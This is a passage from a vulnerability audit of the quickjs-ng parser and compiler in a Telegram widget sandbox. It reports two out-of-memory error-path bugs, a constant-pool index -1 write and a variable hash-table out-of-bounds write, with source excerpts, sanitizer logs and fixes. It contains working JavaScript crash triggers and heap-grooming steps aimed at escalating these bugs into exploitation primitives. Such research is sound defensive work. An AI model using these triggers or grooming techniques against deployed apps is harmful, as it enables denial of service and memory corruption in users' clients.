# Parser / compiler / bytecode OOM audit — quickjs-ng

Date: 2026-11-05. Host-only (no phone, no bot, no modules, no BJSON/bytecode
loader). Scope: memory-safety bugs in the parser, the bytecode compiler and
the bytecode emitter that are reachable from a single synchronous `eval()` of
plain JavaScript in the Telegram widget QuickJS sandbox (6 MiB heap, no host
API, no modules; `eval`/`Function`, BigInt, typed arrays, Proxy and async are
available).

| | commit | version |
|---|---|---|
| audit target (HEAD) | `e22ce4de4362dc5fd4794cfa3c03fc7fdba5f015` | 0.18.0+ (2026-11-02) |
| app engine (Telegram 13.2.0 beta 72799) | `7a23d8e3fedb010070ef1a03873c55500c7aa1a9` | 0.17.0 (2026-10-23) |

Both findings below were re-checked against `7a23d8e`: the affected parser/
compiler functions (`cpool_add` call sites, `js_create_function`,
`update_var_htab`, `find_var_htab`) and the quickjs arena allocator
(`js_arena_free`, `js_arena_usable_size`, `arena_block_sizes`) are identical
(only line numbers differ by ~66). The app already uses the same 4 KiB arena
allocator, so the Scudo build is a faithful app-allocator model.

## Verdict

Two **new, unreported** memory-safety bugs in compilation error paths, both
triggered by ordinary JavaScript under the 6 MiB model and both reproduced on
the app commit's code:

* **C1 — `cpool_add()` failure stored as `parent_cpool_idx = -1`, then used as
  `fd->cpool[-1] = func_obj` in `js_create_function()`.** A 16-byte OOB write
  (one `JSValue`: a heap pointer + tag `-2`) lands 16 bytes before the current
  constant-pool buffer: on the quickjs 8-byte block header plus either the
  preceding arena block's tail (small pool) or the backing allocator's chunk
  header (large pool). ASan: `heap-buffer-overflow WRITE of size 16`;
  app-model allocators: `SIGABRT`/`SIGSEGV` during the error cleanup.
* **C2 — `update_var_htab()` uses a mask derived from the *requested* table
  size after the grow `realloc` failed.** The next `add_var()` probes and
  writes past the old table (4-byte OOB read, conditional 4-byte OOB write).
  The over-full table then makes `find_var_htab()` read a garbage `uint32_t`
  from past the table and use it as an index into `fd->vars[]`
  (`fd->vars[*p].var_name`), a second-order OOB read with a heap-controlled
  index. ASan: `heap-buffer-overflow READ of size 4`; Scudo/plain arena:
  `SIGSEGV` in `find_var_htab()` during `resolve_variables()`. With a
  `0xFF` class-288 block placed after the table and a fine `0;` slack knob,
  the same trigger becomes a **clean, non-crashing 4-byte OOB write** on both
  the glibc arena and Scudo (§4.6); the compile OOM is catchable as a bare
  `null` under an F2 fill, so JS can continue afterwards (§4.7).

No arbitrary read/write or RCE is claimed. The primitives, the reachable
operations and the concrete blockers are described in §3.5, §4.4, §4.6 and
§4.7; §6 summarises which heap-grooming steps would be needed to go further.
The main new results since the first version of this report are the C1
delta/class blocker (§3.7) and the C2 clean, catchable OOB write (§4.6,
§4.7).

### Candidates at a glance

| ID | novelty | class | trigger (plain JS, 6 MiB) | primitive | evidence | blocker |
|---|---|---|---|---|---|---|
| **C1** | new; not in tracker (`parent_cpool_idx`, `cpool_add` → 0 hits) | OOB **write** (16 B) in `js_create_function()` | 211 float literals fill the eval cpool, then `function victim(){}`; the cpool grow fails | 16-byte store at `cpool-16`: `{JSFunctionBytecode *, tag -2}` over the quickjs block header (+ malloc/Scudo chunk header; the block is always a large block because delta > child cost) | ASan WRITE 16, 5/5; debug assert `cpool_idx=-1`; Scudo SIGSEGV in `js_arena_free` | no JS-struct neighbor (delta/class argument, §3.7); corrupted header is freed in the same OOM cleanup; `ar = b - arena_block_sizes[0xFF]*0xFFFE - 48`, BS is a `.rodata` constant (101/8224 measured) → fixed wild fault; uncatchable OOM |
| **C2** | new; not in tracker (`vars_htab`, `add_eval_variables` → only #1869) | OOB **read** (4 B) + OOB **write** (4 B) in the var hashtable; second-order OOB index | pre-intern identifiers, put a 0xFF class-288 string after the 27th var, add `0;` dummy statements; the 64-entry var-table grow fails in `add_eval_variables()` | `*p = k` at `htab + 4*(hash & 127)` on a 64-entry table: **clean, non-crashing** 4-byte write at offsets 84/119/120 (values 55/57/58) on glibc arena **and Scudo**; the garbage u32 read past the table can also index `fd->vars[*p]` (20-byte stride) | ASan READ 4; instrumented arena + Scudo logs showing `ok=0` and 3 `UVH_OOB_WRITE`; Scudo/glibc SIGSEGV in `find_var_htab` without the 0xFF filler | write offsets hash-fixed, value `k >= 26` is never a valid JS tag; vardefs (`20*var_count`) ≈ 6x the failed-grow delta, so the compile always dies in `resolve_variables`; F2 makes the OOM catchable (§4.7) but live-object adjacency did not land |

Known/deduped items (#1782, N1, closure OOM, #1865/#1869, #1787/#1821,
#1852/#1855, #1892, QBC loader) are listed in §2 and are not re-reported.

## 1. Builds, harness and method

All builds are out-of-tree from the pristine snapshot (`src/`, a checkout of
`e22ce4d`); `qjs_now` itself is never modified. The `/tmp` scratch tree is
cleaned aggressively in this environment, so the builds live under
`lab/qjs_parser_audit/build/` (see `build_all.sh`).

| build | flags | allocator model |
|---|---|---|
| `run6m_dbg-asan` | gcc, Debug, `-fsanitize=address,undefined`, `-D__SANITIZE_ADDRESS__` | quickjs large-blocks-only (every allocation checked) |
| `run6m_rel-asan` | gcc, Release (`NDEBUG`), same sanitizers | large-blocks-only + ASan redzones |
| `run6m_rel` | gcc, Release, no sanitizer | **app-like**: 4 KiB arena size classes for blocks ≤ 512 B, malloc for larger |
| `run6m_dbgplain` | gcc, Debug, no sanitizer | app-like, symbols for gdb |
| `run6m_scudo` | clang 19, Release, `-fsanitize=scudo` | **app-model**: quickjs arena backed by Scudo (Android's allocator) |
| `run6m_scudo_instr` | same + instrumented `src_instr` | app-model evidence build (UVH/A288/stage logs) |
| `run6m_instr` | gcc, Release, scratch copy with logging in `update_var_htab()` | app-like, evidence only (never shipped) |

Note for future runs: **clang's ASan does not define `__SANITIZE_ADDRESS__`**
(that macro is GCC-specific). Without `-D__SANITIZE_ADDRESS__` QuickJS keeps
its 4 KiB arena and intra-arena overflows are invisible to ASan. The ASan
builds above define it explicitly and therefore use `JS_ARENA_LARGE_BLOCKS_ONLY`.

`harness/run6m.c` is the widget model: fresh `JSRuntime`, `JS_SetMemoryLimit`
= 6 MiB, `JS_SetMaxStackSize` = 1 MiB, no `JS_NewContext` host functions, one
synchronous `JS_Eval(..., JS_EVAL_TYPE_GLOBAL)`. The filler is an ordinary JS
string (`"x".repeat(F)`); the vulnerable source is a nested `eval()` string,
so the heap is nearly exhausted exactly while the parser/compiler runs. The
filler value `F` is swept in 8-byte steps around the transition.

All sanitizer builds also enable `-fsanitize=undefined` with
`-fno-sanitize-recover=all`; no UBSan report was produced by any PoC (the
first invalid access is always caught by ASan, or faults before UBSan's
instrumentation on the non-ASan builds).

## 2. Dedup: tracker and prior findings

Checked against the upstream tracker on 2026-11-02/05 (GitHub API + web UI
search) and against this project's prior notes:

| item | what it is | relation to C1/C2 |
|---|---|---|
| #1782 (PR, open) | truncated parser `byte_code` Dbuf read in `resolve_variables()` when an `emit_*` failed | **deduped** — different buffer and different failure; its fix (check `dbuf_error(&fd->byte_code)` in `js_create_function`) does not touch `cpool_add` or `update_var_htab` |
| N1 (prior project finding) | `push_scope()` failure ignored → `fd->scopes[-1]` | **deduped** — different function/array; not re-reported |
| closure OOM (prior project finding) | `get_closure_var()` returns -1 on `add_closure_var` failure, used unchecked in `resolve_scope_var` | **deduped** — different array and value |
| #1865 / #1869 (open) | `capture_var()` / `var_ref_count` uint16 truncation > 65535 | unrelated field and path; C2 is `vars_htab`, not `var_ref_count` |
| #1827 / #1826 (merged) | RegExp deletion bytecode lifetime; `Array.find` ownership | unrelated |
| #1828 / #1829 (closed) | `unicode_script()` loop on allocation failure | unrelated |
| #1852 / #1855 (open) | `JS_SetPropertyInternal2` OOM value loss; array `length` NULL deref | runtime, not parser |
| #1892 (open) | signed refcount overflow in `JS_DupValue`/`JS_DupAtom` | unrelated |
| #1787 / #1821 (open) | label leak in `resolve_labels`, invalid opcode in release | unrelated code-generator correctness bug; no memory corruption claimed upstream |
| #1853/#1518/#1394/#1379 | QBC bytecode loader bugs | out of scope (no bytecode loader in the widget) |
| F2 (regexp worker, `notes/audit_regexp_postfix.md`) | bare-null OOM is catchable when the heap is exhausted by small live objects | **reused, not claimed**: used in §4.7 to catch the C2 compile OOM; it does not save C1 (the free faults in C) |

Targeted searches (all on `quickjs-ng/quickjs`): `parent_cpool_idx` → 0,
`cpool_add` → 0, `vars_htab` → 0, `"too many variables"` → 0,
`add_eval_variables` → only #1869, `cpool` → 13 results, all QBC-loader or
build issues. No issue or PR describes C1 or C2.

## 3. C1 — constant-pool OOM → `cpool[-1]` OOB write

### 3.1 Root cause

Three call sites store an unchecked `cpool_add()` result into
`JSFunctionDef.parent_cpool_idx` (function declarations/expressions,
class-field initialisers and the class default constructor):

```c
/* js_parse_function_decl2(), quickjs.c:37939 (e22ce4d) */
idx = cpool_add(s, JS_NULL);
fd->parent_cpool_idx = idx;          /* -1 when the realloc fails */
...
emit_op(s, OP_fclosure);
emit_u32(s, idx);                    /* 0xffffffff in the bytecode */

/* emit_class_init_end(), quickjs.c:25500 */
cpool_idx = cpool_add(s, JS_NULL);
cf->fields_init_fd->parent_cpool_idx = cpool_idx;

/* js_parse_class_default_ctor(), quickjs.c:25567 */
idx = cpool_add(s, JS_NULL);
fd->parent_cpool_idx = idx;
```

`cpool_add()` returns -1 when `js_resize_array()` cannot grow the pool. The
parser keeps going (the pending OOM is not checked here), and later
`js_create_function()` does:

```c
/* quickjs.c:37072-37084 */
list_for_each_safe(el, el1, &fd->child_list) {
    fd1 = list_entry(el, JSFunctionDef, link);
    cpool_idx = fd1->parent_cpool_idx;
    func_obj = js_create_function(ctx, fd1);
    if (JS_IsException(func_obj))
        goto fail;
    assert(cpool_idx >= 0);          /* compiled out with NDEBUG (app) */
    fd->cpool[cpool_idx] = func_obj; /* cpool[-1] */
}
```

`JSValue` is 16 bytes on 64-bit, so the store is:
`[u = pointer to the child JSFunctionBytecode][tag = 0xFFFFFFFFFFFFFFFE]` at
`(uint8_t *)fd->cpool - 16`.

### 3.2 Trigger (plain JS, 6 MiB, no host API)

```js
var filler = "x".repeat(6184000);
eval("1e300;".repeat(211) + "function victim(){}");
```

The 211 float literals fill the eval script's constant pool to its exact
capacity (211 entries). `function victim(){}` then needs a pool grow to 316
entries (a 5056-byte request, 1672-byte delta); if that realloc fails,
`victim->parent_cpool_idx` is -1. The rest of the source is just `}` + `0;`,
so the parse still completes and `js_create_function()` reaches the OOB store.
`K = 211` gives a ~1.6 KiB wide filler window; `K = 28` still works with a
224-byte window.

`poc/gen_cpool.py <F> <K>` generates the script; `poc/c1_k211_*.js` are the
fixed reproductions.

### 3.3 Evidence

* **ASan, release, 5/5 runs** (`poc/c1_k211_release_asan.js`, F=6184000):

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 16 at 0x51f000000e78 thread T0
    #0 js_create_function  .../src/quickjs.c:37083
    #1 __JS_EvalInternal  .../src/quickjs.c:38306
    ...
0x51f000000e78 is located 8 bytes before 3384-byte region
[0x51f000000e80,0x51f000001bb8)
allocated by ... cpool_add ... js_resize_array ... (from emit_push_const)
```

The region is the 211-entry pool (211*16 = 3376 bytes + 8-byte quickjs block
header). The 16-byte store straddles the block boundary: the first 8 bytes go
before the allocation, the second 8 bytes overwrite the quickjs
`JSMallocBlockHeader`.

* **Debug build assertion + gdb** (`logs/c1_gdb_assert.txt`): at the assert,

```
cpool_idx = -1
fd1->parent_cpool_idx = -1
fd->cpool_count = 211  fd->cpool = 0x51f000000e88
```

  i.e. the child function was compiled successfully and the save into the
  parent pool is the failing operation.

* **App-like arena + glibc** (`poc/c1_k211_plain.js`, F=6178000, 5/5):
  `free(): invalid next size (normal)`, SIGABRT. gdb shows the abort inside
  `js_arena_realloc()` from `resolve_variables()`: the corrupted chunk
  metadata is detected by glibc `realloc()`.

* **App-model allocator, Scudo** (`poc/c1_k211_scudo.js`, F=6180616, 5/5):
  SIGSEGV in `js_arena_free()` at `quickjs.c:1863`
  (`b->u.free_next = ar->first_free_block;`), called from `js_free_rt` ←
  `js_free_function_def` ← `js_create_function` error path.

### 3.4 Why the allocator goes wild

`JSMallocBlockHeader` is 8 bytes immediately before every quickjs user
pointer: `u.block_idx/free_next` (u16), `block_size_idx` (u8),
`gc_obj_type:7/mark:1` (u8), `ref_count` (int32). The `tag = -2` half of the
OOB store writes `FE FF FF FF FF FF FF FF` over it, i.e.
`block_idx = 0xFFFE`, `block_size_idx = 0xFF`, `ref_count = -1`.
On free, `js_arena_usable_size()` sees `block_idx != JS_ARENA_FREE_NIL` and
reads `arena_block_sizes[0xFF]` — a 16-bit read 448 bytes past the 31-entry
static table (an OOB read of `.rodata`). `js_arena_free()` then treats a large
block as a small block, computes

```c
ar = (JSArena *)((uint8_t *)b - block_size * 0xFFFE - sizeof(JSArena));
b->u.free_next = ar->first_free_block;   /* wild read, SIGSEGV */
```

with `block_size = arena_block_sizes[0xFF]`. That is the observed Scudo
SIGSEGV. On builds where the first half of the store reaches malloc/Scudo
chunk metadata instead, the allocator aborts earlier (`invalid next size`,
checksum mismatch).

### 3.5 Primitive and weaponization

* **Write value**: always `{ ptr_to_child_JSFunctionBytecode, tag -2 }`.
  `u` is a genuine heap pointer (a leak into the target slot), the tag is
  fixed.
* **Write address**: `cpool - 16`, fixed. The cpool buffer is the eval
  function's constant pool (capacity 1..5395 entries; `K` must be one of the
  `js_resize_array` capacities); its address is not attacker-chosen.
* **Which object is hit**: the 8 bytes immediately before the quickjs block
  header. For a small arena block that is the **last 8 bytes of the
  preceding block's user data** (same 4 KiB arena, previous size class);
  for a large block it is the malloc/Scudo chunk metadata. A JS object's
  security-relevant fields are at its head, not its tail, so the useful
  target is allocator metadata / the arena free list.
* **Blocker**: the corrupted header is freed during the same OOM cleanup
  (either by `js_free_function_def()` or after the pool is copied in
  `js_create_function()`). The free path computes a wild `ar` from
  `block_size_idx = 0xFF` and faults before any attacker-controlled use.
  The compiled `victim` is never reached (the eval aborts with the pending
  OOM). The `OP_fclosure` operand `-1` is *not* a second primitive here: in
  `resolve_labels()` the signed check `idx < 256` rewrites it to
  `OP_fclosure8 0xff`, i.e. a runtime `b->cpool[255]` read (no bounds check at
  `quickjs.c:18229/18232`) if compilation ever completed.
* **Grooming path**: to turn the pointer half into a leak, the preceding
  block would have to be a live, JS-observable value (e.g. a string whose
  bytes encode the pointer) and the cpool free would have to survive. Both
  require controlling `arena_block_sizes[0xFF]` (build-dependent `.rodata`)
  or making `ar` land in mapped memory; on Scudo the checksum/`ar` fault
  happens first. A cleaner route would be a large pool placed directly after
  an object whose *tail* is a JSValue union (so the 8-byte pointer becomes a
  float64 bit pattern readable from JS), but the free still runs before the
  next JS instruction.

### 3.6 Fix

Check every `cpool_add()` result that escapes into a `JSFunctionDef` or the
bytecode (`js_parse_function_decl2()`:37939, `emit_class_init_end()`:25500,
`js_parse_class_default_ctor()`:25567) and abort the parse on failure; and
make `js_create_function()` validate `0 <= cpool_idx < fd->cpool_count`
before the store (defence in depth against the class of unchecked-index bugs).

### 3.7 Follow-up: can the write reach a JS struct? (new, negative)

The follow-up asked whether the block before `fd->cpool` can be groomed into
a JSArrayBuffer/JSObject/JSString so the 16-byte store hits
`u.ptr`/`byte_length`/`shape`/`u.array.count`. On the app-model allocator
the answer is **no**, for two independent reasons measured on this build:

1. **Delta vs child cost.** The failed grow must leave enough slack for
   `js_create_function(victim)` to finish (the store happens only after the
   child is created). The empty `victim` costs 129 bytes in
   `js_mallocz(function_size)` (measured: `STAGE pre_funalloc size=129`),
   plus the child's `resolve_variables()` buffers. A capacity-`K` pool grows
   to `K*3/2` entries, so the failed request delta is
   `(K/2)*16 - usable(old block)`. For `K = 28` (old block 456 bytes, class
   480) the delta is only 200 bytes, and an exhaustive sweep over the filler
   and a fine-grained `0;` bytecode prefix (0..300 statements, four filler
   values) never reached a failed grow on the arena build. The first
   capacity with delta > child+transient is `K = 42` (delta ~328 bytes), and
   its old block is 680 bytes — **larger than the 512-byte arena limit**, so
   it is a backing-allocator (malloc/Scudo) block, not an arena neighbor.
   All larger capacities are likewise large blocks. A small cpool (class
   24..480) cannot both fail the grow and create the child.
2. **No matching struct class anyway.** Pool blocks are class 24/40/56/72/
   104/160/224/320/480. `JSObject` is 72 bytes (class 80),
   `JSArrayBuffer` 56 (class 64), `JSTypedArray` 48 (class 56, but a
   capacity-3 pool has a 16-byte delta). The class-480/320/224 neighbors are
   string/array-buffer/dbuf *data* areas: the last 8 bytes of a 16-element
   values buffer are padding, and a string's last 8 bytes are characters.
   None of them is a struct field.

The cleanup free is also unavoidable: `js_create_function()` frees
`fd->cpool` after the copy, and `js_free_function_def()` frees it on every
failure path. The `tag = -2` half always sets `block_idx = 0xFFFE`,
`block_size_idx = 0xFF`; `js_arena_free()` then reads
`arena_block_sizes[0xFF]` (BS) and computes
`ar = b - BS*0xFFFE - sizeof(JSArena)`. Measured BS: **101** in
`run6m_rel`/`run6m_scudo` (ar = b - 6.62 MiB) and **8224** in
`run6m_dbgplain` (ar = b - 514 MiB). BS is a `.rodata` constant we cannot
influence; the Scudo run faults at `ar->first_free_block`, the glibc run
aborts earlier on the corrupted chunk size. So C1 stays a fixed-offset write
into allocator metadata + a deterministic crash: DoS, not a primitive.

## 4. C2 — var hash-table growth after failed realloc → OOB read / second-order index

### 4.1 Root cause

```c
/* quickjs.c:24202-24235, e22ce4d */
static int update_var_htab(JSContext *ctx, JSFunctionDef *fd)
{
    uint32_t i, j, k, m, *p;
    if (fd->var_count < 27) return 0;
    k = fd->var_count - 1;
    m = fd->var_count + fd->var_count/5;   /* load-factor estimate */
    if (m & (m - 1)) goto insert;          /* not a power of two */
    m *= 2;                                /* grow */
    p = js_realloc(ctx, fd->vars_htab, m * sizeof(*fd->vars_htab));
    if (!p) return -1;                     /* table size UNCHANGED */
    ...
insert:
    m = UINT32_MAX >> clz32(m);            /* mask from the *requested* m */
    do {
        i = hash32(fd->vars[k].var_name);
        j = 1;
        for (;;) {
            p = &fd->vars_htab[i & m];     /* can be past the old table */
            if (*p == UINT32_MAX) break;
            i += j; j += 1;
        }
        *p = k++;                          /* 4-byte OOB write */
    } while (k < (uint32_t)fd->var_count);
    return 0;
}
```

After a failed grow the code has already incremented `var_count`, but the
table still has its old size. The next `add_var()` recomputes `m` from the new
`var_count` and, because `m` is no longer the power of two that triggered the
failed grow, takes the `insert` path with a mask that is twice the old table
size (e.g. mask 127 on a 64-entry table). `find_var_htab()` computes the same
too-large mask:

```c
/* quickjs.c:24238-24255 */
m = fd->var_count + fd->var_count/5;
m = UINT32_MAX >> clz32(m);
p = &fd->vars_htab[i & m];
if (*p == UINT32_MAX) return -1;
if (fd->vars[*p].var_name == var_name)   /* *p is garbage -> OOB index */
    return *p;
```

`JSVarDef.var_name` is at offset 0 and `sizeof(JSVarDef)` is 16 bytes on this
build, so `fd->vars[*p].var_name` is a load at `fd->vars + 16 * *p` with a
full 32-bit garbage index (the gdb crash shows `cmp %r12d,(%rcx,%r9,4)` with
`r9 = 4 * *p`). The index can therefore reach up to 64 GiB past the array; if
the loaded `var_name` happens to equal the atom, the compiler accepts the
bogus variable index.

### 4.2 Trigger and the pre-intern trick

`poc/gen_htab2.py <F> <n> <pads>` generates:

```js
var v0,v1,...,v51,f,a,__var_,__arg_var__;   /* pre-intern identifiers */
var filler = "x".repeat(F);
eval('function f(a=1){eval("0");var v0,...,v51;}0;');
```

`f` is non-strict, has a parameter expression (`a=1`, so
`has_parameter_expressions` is set) and a direct `eval` call, so
`add_eval_variables(f)` runs at compile time. With 52 declared vars + the
parameter-expression copy, `f->var_count` at that point is 53. The first
`add_var(__var_)` makes it 54, i.e. `m = 54 + 10 = 64` (a power of two): the
table (64 entries, 256 bytes) is grown to 128 entries. If that realloc fails,
the second `add_var(__arg_var_)` computes `m = 55 + 11 = 66` and mask 127 on
the 64-entry table → OOB probes.

The identifiers are declared in the outer script on purpose: the arena
allocator's atom-table growth transient otherwise keeps the parse-end slack
above the 232-byte grow delta, and the failed grow is never reached. With the
names already interned, the parse ends with only 128 bytes of slack and the
grow fails deterministically. This is an allocator-accounting trick, not a
different bug.

### 4.3 Evidence

* **ASan, release** (`poc/c2_htab_asan.js`, F=6187888):

```
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 4 at 0x51200000165c thread T0
    #0 update_var_htab .../src/quickjs.c:24228
    #1 add_var         .../src/quickjs.c:24466
    #2 add_eval_variables .../src/quickjs.c:34609
    #3 js_create_function  .../src/quickjs.c:37062
0x51200000165c is located 20 bytes after 264-byte region
[0x512000001540,0x512000001648)
```

  264 bytes = 8-byte quickjs header + 64-entry table (256 bytes). The first
  OOB probe is at table entry 69 (264 + 20 - 8 = 276 bytes from the user
  pointer). `logs/c2_rel_asan.txt`.

* **Instrumented app-like arena build** (`poc/c2_htab_arena.js`,
  F=6183072; `logs/c2_instr_arena.txt`): 37 OOB accesses logged; the grow
  failure is explicit:

```
UVH_GROW count=54 newcap=128 ok=0 used=6291328 lim=6291456   (128-byte slack)
UVH_OOB_READ count=55 mask=127 idx=69 cap=64 k=54
UVH_OOB_READ count=55 mask=127 idx=78 cap=64 k=54
UVH_OOB_READ count=55 mask=127 idx=88 cap=64 k=54
...
UVH_INS count=56 mask=127 k=55 cap=64
UVH_OOB_READ count=57 mask=127 idx=70 cap=64 k=56      (new_target)
```

* **App-model (plain arena, glibc)** (`poc/c2_htab_arena.js`): 8/8 SIGSEGV
  in `find_var_htab()` at `quickjs.c:24250` ← `resolve_scope_var` ←
  `resolve_variables` (`logs/c2_plain_gdb.txt`, `logs/c2_instr_arena_gdb.txt`).

* **App-model (Scudo)** (`poc/c2_htab_scudo.js`, F=6184968): 5/5 SIGSEGV in
  `find_var_htab()` at `quickjs.c:24250`
  (`if (fd->vars[*p].var_name == var_name)`), reached from
  `resolve_scope_var()` and `resolve_variables()` (`logs/c2_scudo_gdb.txt`).
  A 256-byte-wide filler band (6,184,872..6,185,128) is 33/33 deterministic
  at 8-byte steps.

### 4.4 Primitive and weaponization

* **First-order OOB**: 4-byte reads at `htab + 4*(i & (2*cap-1))`, i.e. up to
  `4*cap-4` bytes past a `cap`-entry table (256..508 bytes past a 64-entry
  table). The conditional 4-byte write (`*p = k`, a small var index such as
  54) happens only if the probed slot contains `0xFFFFFFFF`. Arena metadata
  never does, so the write lands in attacker/data-controlled block contents
  (e.g. a string's `0xFF` bytes), not in a block header.
* **Second-order OOB (the interesting one)**: `find_var_htab()` treats the
  32-bit value read past the table as an index into `fd->vars` with the
  16-byte `JSVarDef` stride. If the following arena blocks are groomed so
  that the value is a chosen small integer `X`, the compiler reads/follows
  `fd->vars[X]`; if the
  comparison at `var_name` matches (atom ids are deterministic in a fresh
  runtime, and the attacker chooses the identifier), `find_var()` returns
  `X` and `resolve_scope_var()` emits `OP_get_loc`/`OP_put_loc` with
  `dbuf_put_u16(bc, var_idx)`, i.e. `X & 0xffff`. That would be a
  bytecode-level **chosen local-variable index**: at run time
  `var_buf[X & 0xffff]` is a JSValue read/write up to 512 KiB past the frame.
* **Blocker**: the trigger is an allocation failure, and the same OOM aborts
  the compilation before the function bytecode is created (the htab failure
  leaves only ~128 bytes of slack; `js_create_function()` later needs several
  KiB for `JSFunctionBytecode`). `resolve_variables()` does make progress and
  is exactly where the second-order read fires, but it cannot complete.
  Turning this into a runtime primitive needs a way to free a few KiB
  between the failed grow and the end of compilation (none found: the parser
  frees `fd->byte_code` only after `bc_out` is built, and `bc_out` itself
  needs memory), or a non-OOM way to reach an over-full table (the 65535-var
  limit and the mask computation are consistent on the success path, so none
  was found). Also, the first-order write value is a small var index and the
  write position is hash-fixed per atom, so direct metadata corruption via
  `update_var_htab()` is unlikely.

### 4.5 Fix

Do not derive the mask from `var_count` when the grow failed. Either store the
table's current mask/size in `JSFunctionDef` (and use it for both insert and
lookup), or abort compilation on any `add_var()` failure (pass the error up
from `add_eval_variables()` instead of ignoring the return values at
`quickjs.c:34605/34609/34617-34623`). Both `find_var_htab()` and the insert
path must use the same mask, and the mask must never exceed the allocated
table.

### 4.6 Follow-up: clean OOB write on the app-model allocator (new)

The earlier C2 runs crashed in `find_var_htab()` because the OOB probe read
garbage and used it as an `fd->vars` index. Two changes turn the same trigger
into a **non-crashing, repeatable 4-byte OOB write**:

1. Put a `0xFF`-filled class-288 allocation immediately after the 64-entry
   table. `sizeof(JSString) = 40`, so a 220-byte `"\xff"` literal is
   `40+221+8 = 269` bytes (class 288). It is declared right after the 27th
   var, so its allocation follows the table allocation. The OOB probes read
   `0xFFFFFFFF` in its data, stop, and execute `*p = k` instead of walking
   into `fd->vars`.
2. The big filler is page-quantized on glibc/Scudo (`malloc_usable_size` of
   the mmap'd 6 MB string rounds to pages: changing `F` by 384 bytes left
   `malloc_size` unchanged), so 8-byte `F` steps cannot tune the last few
   hundred bytes of slack. Adding `0;` statements to `f` works: each adds two
   bytecode bytes and the parser's `byte_code` DynBuf moves in arena-class
   steps. With `K = 8..14` dummy statements the grow fails at count 54
   (`ok=0`, `used` within 200 bytes of the limit) on both the glibc arena
   and the **Scudo** app-model build:

```
UVH_GROW count=54 newcap=128 ok=0 used=6291463 lim=6291456   (Scudo)
UVH_OOB_WRITE count=56 mask=127 idx=84  cap=64 k=55
UVH_OOB_WRITE count=58 mask=127 idx=119 cap=64 k=57
UVH_OOB_WRITE count=59 mask=127 idx=120 cap=64 k=58
STAGE resolve_vars_FAIL ... EXCEPTION: InternalError: out of memory
```

The eval exits with the normal uncatchable OOM (`rc=2`), **no crash** — on
the Android allocator model the write is a clean OOB store into the adjacent
allocation. `logs/c2_ff_scudo_k8.txt`, `logs/c2_ff_arena_k8.txt`,
`poc/c2_ff_scudo.js`, `poc/gen_htab_ff2.py`.

Why this still does not become a controlled primitive:

* **Fixed offsets.** The probe indices are determined by the built-in atom
  hashes (`__arg_var_`, `this`, `new_target`, ...), not by attacker-chosen
  names. With the 64-entry table the writes land at block1 offsets 48, 188
  and 192. A class-288 block can be a 16-element array values buffer
  (16-byte JSValue slots): offset 48 = element 3's `u` low half, 188 =
  element 11's tag high half, 192 = element 12's `u` low half. A tag write
  with `k >= 26` is an invalid tag (valid tags are 0..7 or the negative
  refcounted tags; the table only exists for `var_count >= 27`, so
  `k = var_count-1 >= 26`). A `u` write produces
  `(original high 32 bits) | k`, a wild pointer; freeing that value during
  runtime teardown is a wild refcount decrement (DoS), not an address we can
  map without a leak.
* **Compile cannot complete.** `JSFunctionBytecode` copies
  `arg_count+var_count` `JSVarDef`s (`sizeof = 20`). At the first boundary
  `var_count ≈ 1.2*m` and the failed-grow delta is `4*m` bytes, so the
  vardefs alone are ~6x the delta; `resolve_variables()` must also build
  `bc_out` while the old bytecode is still allocated. With slack < delta the
  compile always dies before `js_mallocz(function_size)` — observed as
  `resolve_vars_FAIL` in every clean run.
* **Uncatchable OOM.** `JS_ThrowOutOfMemory()` goes through
  `JS_ThrowInternalError()`, which sets `is_uncatchable_error` in both
  `e22ce4d` and the app commit `7a23d8e` (`quickjs.c:8493/8507`). A
  `try { eval(...) } catch(e) {}` does **not** catch it; no JS runs after the
  failing eval. If the host reuses the *context* across widget updates, a
  later eval could observe a data-only corruption (e.g. an integer array
  element changed to `k`), but the useful pointer/tag targets crash at
  teardown, and making the adjacent block a live array requires freeing a
  class-288 block deterministically — `A.length = 0` keeps the values buffer
  and the engine exposes no `gc()` (GC is only triggered from shape
  allocation, `quickjs.c:6144`), so the array-adjacency experiment was not
  landed.

So C2's ceiling in this audit is: a reliable, non-crashing 4-byte OOB write
of a small var index at hash-fixed offsets past the var hash table, plus an
OOB read that can be turned into a wild `fd->vars` index (crash). It is a
real memory-corruption primitive, but not an arbitrary read/write.

### 4.7 F2 (bare-null OOM) and the catch-and-continue experiments (new)

The regexp worker's **F2** finding applies directly to this bug class:
`JS_ThrowOutOfMemory()` falls back to `JS_NULL` when the error object itself
cannot be allocated, and `js_set_uncatchable_error()` ignores non-objects, so
the OOM becomes a **catchable bare `null`**. Reproduced in this harness on
both allocators (`poc/f2_probe.js`, from `lab/qjs_regexp_audit/`): result
`11` (fill OOM caught as null + allocations work after dropping the fill).

For C2 this was the missing observation channel:

```js
// build SRC first, then fill the heap with small live objects
try { for (;;) keep.push(...small objects...); } catch (e) { fo = (e===null); }
try { eval(SRC); } catch (e) { r = (e===null) ? 1 : 2; }   // r = 1: caught
keep = null;   // free the fill
// JS continues; live objects can be inspected
```

Measured on the glibc arena build with a `{p:prev}` object chain
(`poc/gen_c2_f2.py`): a band of fill counts (N=51520..51553, `used` close to
6 MiB) yields `fo=0, r=1` — the fill succeeded and the **compile OOM from the
nested eval was caught as bare `null`** (some N in the band instead throw an
uncatchable InternalError because the error object still fits; the band is
deterministic per N). This makes OOM-gated bugs observable in the same eval
and enables in-run filler sweeps (no host loop): the script can fill, try
`eval()`, catch, adjust and retry.

What this did **not** solve:

* **C1 is unaffected.** The cpool `-1` write and the wild
  `js_arena_free()` fault happen inside `js_create_function()` *before* the
  OOM reaches the catch handler; there is no C-level handler to catch a
  SIGSEGV. F2 cannot avoid the corrupted-header free.
* **C2 live-object targeting did not land.** Several heap-shaping variants
  were tried to put a live class-288 object immediately after the var hash
  table: a 220-char `"\xff"` string, a 16-element `-1` int array (whose
  `u` fields are `0xFFFFFFFF` and therefore trigger the write), and
  A/B pair sequences preceded by dummy class-288 `ArrayBuffer`s to force a
  fresh arena (`poc/gen_c2_f2_arr.py`, `poc/gen_c2_f2_arr2.py`). In the
  successful catch runs (`fo=0, r=1`) the target object was never modified
  (`B[3]`/`B[12]` stayed `-1`). Class-288 instrumentation shows why: the
  64-entry table is allocated from the quickjs arena free list, and at that
  moment the head is whichever block the parser or the previous compile
  freed last — multiple class-288 arenas exist and the allocation order is
  LIFO, so the pair (`A_last`, `B_last`) is not necessarily the arena the
  table is served from. The one reliable adjacency found is the *parser's
